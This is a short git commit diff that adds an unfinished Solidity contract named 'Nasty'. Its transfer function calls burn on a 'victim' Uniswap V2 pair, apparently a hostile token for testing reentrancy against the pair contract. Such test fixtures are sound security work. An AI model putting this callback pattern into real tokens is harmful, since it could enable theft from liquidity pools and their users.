4d48b360aae0e1cd4036074c5ea5c4ebd5afc042
Lorenzo Manacorda <lorenzo@mailbox.org>
2020-04-23 17:51:55 +0200

    wip

--- src/Nasty.sol
+++ src/Nasty.sol
@@ -1,4 +1,17 @@
 pragma solidity ^0.5.15;
 
+import "ds-math/math.sol";
+
 contract Nasty {
+    mapping(address => uint) public balanceOf;
+    address public victim;
+
+    function transfer(address to, uint value) external returns (bool) {
+        balanceOf[msg.sender] = DSMath.sub(balanceOf[msg.sender], value);
+        balanceOf[to] = DSMath.add(balanceOf[to], value);
+
+        UniswapV2Pair(victim).burn(to);
+
+        return true;
+    }
 }
